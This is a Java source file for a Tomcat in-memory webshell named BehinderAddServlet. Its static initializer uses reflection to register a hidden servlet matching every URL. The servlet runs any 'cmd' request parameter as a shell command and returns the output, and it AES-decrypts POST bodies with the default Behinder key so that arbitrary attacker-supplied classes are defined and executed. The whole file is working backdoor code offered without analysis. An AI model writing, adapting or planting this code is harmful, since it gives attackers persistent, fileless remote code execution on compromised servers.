import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Scanner;

public class BehinderAddServlet implements Servlet{
    static {
        final String name = "AutoAddServlet";
        final String urlPattern = "/*";
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            BehinderAddServlet evilServlet = new BehinderAddServlet();

            // 创建并配置wrapper
            org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();
            evilWrapper.setName(name);
            evilWrapper.setLoadOnStartup(1);

            evilWrapper.setServlet(evilServlet);
            evilWrapper.setServletClass(evilServlet.getClass().getName());

            // 将wrapper添加到children中
            standardContext.addChild(evilWrapper);

            // 添加mapping内容
            Method gmap = StandardContext.class.getDeclaredMethod("addServletMappingDecoded",String.class,String.class,boolean.class);
            gmap.invoke(standardContext,urlPattern, name,false);
        } catch (Exception hi) {
            //hi.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig config) throws ServletException {
        System.out.println("BehinderAddServlet Start ......");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        try {
            System.out.println("Do Servlet ......");
            // 获取request和response对象
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();

            // Cmd MemShell
            String cmd = request.getParameter("cmd");
            if(cmd != null && !cmd.isEmpty()){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }

            //create pageContext
            HashMap pageContext = new HashMap();
            pageContext.put("request",request);
            pageContext.put("response",response);
            pageContext.put("session",session);

            // Behinder MemShell
            if (request.getMethod().equals("POST")) {
                String k = "e45e329feb5d925b";  /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                session.putValue("u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                //revision Behinder
                Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                method.setAccessible(true);
                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);
                evilclass.newInstance().equals(pageContext);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }
}